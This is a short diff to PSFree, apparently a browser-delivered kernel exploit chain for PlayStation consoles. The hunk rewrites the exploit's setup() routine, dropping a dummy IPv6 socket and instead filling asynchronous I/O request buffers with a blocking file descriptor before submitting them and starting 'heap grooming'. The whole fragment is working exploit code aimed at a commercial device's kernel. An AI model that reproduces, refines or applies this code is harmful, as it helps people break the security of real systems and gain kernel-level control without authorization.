@@ -1,4 +1,3 @@
-
 /* Copyright (C) 2025 anonymous
 This file is part of PSFree.
 
@@ -1650,18 +1649,10 @@ function setup(block_fd) {
     const reqs1 = new Buffer(0x28 * num_workers);
     const block_id = new Word();
 
-  const dummy_sock = sysi('socket', AF_INET6, SOCK_DGRAM, 0);
-  if (dummy_sock < 0) {
-    die('❌ setup(): impossibile creare dummy socket per AIO');
-  }
-  log(`dummy_sock creato: ${dummy_sock}`);
-
-  
-    
     for (let i = 0; i < num_workers; i++) {
-        reqs1.write32(0x20 + i * 0x28, dummy_sock);
+        reqs1.write32(8 + i*0x28, 1);
+        reqs1.write32(0x20 + i*0x28, block_fd);
     }
-      const aio_id = new Word();
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
     log('heap grooming');
